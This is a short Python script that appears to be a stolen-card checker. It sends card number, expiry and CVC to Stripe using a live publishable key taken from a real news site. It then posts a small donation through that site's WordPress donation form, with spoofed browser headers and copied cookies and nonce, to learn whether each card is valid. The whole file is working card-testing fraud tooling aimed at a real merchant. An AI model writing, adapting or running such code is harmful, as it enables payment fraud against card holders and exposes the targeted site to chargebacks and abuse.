def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()

	headers = {
			'authority': 'api.stripe.com',
			'accept': 'application/json',
			'accept-language': 'en-US,en;q=0.9,my;q=0.8',
			'content-type': 'application/x-www-form-urlencoded',
			'origin': 'https://js.stripe.com',
			'referer': 'https://js.stripe.com/',
			'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
			'sec-ch-ua-mobile': '?1',
			'sec-ch-ua-platform': '"Android"',
			'sec-fetch-dest': 'empty',
			'sec-fetch-mode': 'cors',
			'sec-fetch-site': 'same-site',
			'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
	}

	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&key=pk_live_51DMipVKeLHvIBrT6uZAz9LxYzOMOThN05PGot0yoYRIOZNp15FLoaEoWAMJpapXjk4KRouXSLi0rQFEVB6uT6UqC00j5WzCylK'
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

	pm = r1.json()['id']

	cookies = {
			'__stripe_mid': 'e5b01e8c-dacf-4f97-b04e-4aca065681857ee92e',
			'__stripe_sid': 'a94de27d-e021-4b13-8690-30e4fa15c00c581cca',
	}

	headers = {
			'authority': 'tasmanianinquirer.com.au',
			'accept': '*/*',
			'accept-language': 'en-US,en;q=0.9,my;q=0.8',
			'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
			# 'cookie': '__stripe_mid=cd04496a-fc78-49f6-99fc-6310e3e55e6221dc47; __stripe_sid=b3b7888f-21a6-4ff7-a3cf-b0242d6fcf37cce97e',
			'origin': 'https://tasmanianinquirer.com.au',
			'referer': 'https://tasmanianinquirer.com.au/contribute/',
			'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
			'sec-ch-ua-mobile': '?1',
			'sec-ch-ua-platform': '"Android"',
			'sec-fetch-dest': 'empty',
			'sec-fetch-mode': 'cors',
			'sec-fetch-site': 'same-origin',
			'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
			'x-requested-with': 'XMLHttpRequest',
	}

	params = {
			't': '1728134582304',
	}

	data = {
			'data': '__fluent_form_embded_post_id=3500&_fluentform_3_fluentformnonce=f254f6607b&_wp_http_referer=%2Fcontribute%2F&payment_input_1=5&email=rein48287%40gmail.com&names_1%5Bfirst_name%5D=Rein&names_1%5Blast_name%5D=Rein&payment_method=stripe&checkbox%5B%5D=Check%20to%20receive%20a%20free%20email%20alert%20when%20we%20publish%20a%20new%20story&__entry_intermediate_hash=372032a6a1cf4f2f7168c0435348c0a3&__stripe_payment_method_id='+str(pm)+'',
			'action': 'fluentform_submit',
			'form_id': '3',
	}
	
	response = requests.post(
			'https://tasmanianinquirer.com.au/wp-admin/admin-ajax.php',
			params=params,
			cookies=cookies,
			headers=headers,
			data=data,
	).json()
	try:
		ii=response['errors']
	except:
		return 'success'
	return ii
	
